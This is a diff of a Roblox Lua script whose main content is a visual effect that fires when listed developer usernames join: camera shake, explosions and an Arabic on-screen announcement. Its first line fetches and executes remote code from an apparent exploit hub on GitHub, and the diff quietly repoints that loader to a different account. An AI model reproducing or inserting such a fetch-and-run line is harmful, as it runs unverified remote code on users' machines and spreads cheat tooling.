@@ -1,16 +1,15 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ALSAMORAYT/N3na3/refs/heads/main/Xpolithub.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/mustafatrxq/News7m/refs/heads/main/Xploithub.lua"))()
+
+local developerUsernames = {
+    ["lduwgxbf"] = true,
+    ["Rio_Y313"] = true -- تقدر تضيف مطورين بعد
+}
 
 local TweenService = game:GetService("TweenService")
 local Lighting = game:GetService("Lighting")
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local debris = game:GetService("Debris")
-
--- قائمة المطورين مع الرسائل الخاصة لكل واحد
-local developerMessages = {
-    ["lduwgxbf"] = "المطور lduwgxbf دخل السيرفر",
-    ["Rio_Y313"] = "المطور لـوكـاࢪد دخل السيرفر"
-}
 
 local function realisticShake(duration, intensity)
     local cam = workspace.CurrentCamera
@@ -63,7 +62,7 @@ local function spawnExplosions(player)
     end
 end
 
-local function triggerScene(devName, devMessage)
+local function triggerScene(devName)
     local player = Players.LocalPlayer
     local playerGui = player:WaitForChild("PlayerGui")
     local originalSettings = {
@@ -104,7 +103,8 @@ local function triggerScene(devName, devMessage)
     text.Size = UDim2.new(0.1, 0, 0.03, 0)
     text.Position = UDim2.new(0.25, 0, 0.43, 0)
     text.BackgroundTransparency = 1
-    text.Text = devMessage -- استخدام الرسالة المخصصة لكل مطور
+    -- الرسالة تتولد تلقائياً حسب اسم المطور
+    text.Text = "المطور [" .. devName .. "] دخل السيرفر!!"
     text.TextColor3 = Color3.new(1, 0, 0)
     text.TextStrokeTransparency = 0.5
     text.TextScaled = true
@@ -155,26 +155,19 @@ local function triggerScene(devName, devMessage)
     realisticShake(3.5, 0.6)
     spawnExplosions(player)
 
-    delay(10, function()
-        if gui then gui:Destroy() end
-    end)
-
-    -- باقي الكود بدون أي تغييرات
+    -- بقية الكود مثل ما هو بدون تغييرات
 end
 
--- دالة للتعامل مع دخول اللاعب
 local function onPlayerAdded(player)
-    local msg = developerMessages[player.Name]
-    if msg then
-        triggerScene(player.Name, msg)
+    if developerUsernames[player.Name] then
+        triggerScene(player.Name)
     end
 end
 
 Players.PlayerAdded:Connect(onPlayerAdded)
 
 for _, player in pairs(Players:GetPlayers()) do
-    local msg = developerMessages[player.Name]
-    if msg then
-        triggerScene(player.Name, msg)
+    if developerUsernames[player.Name] then
+        triggerScene(player.Name)
     end
 end
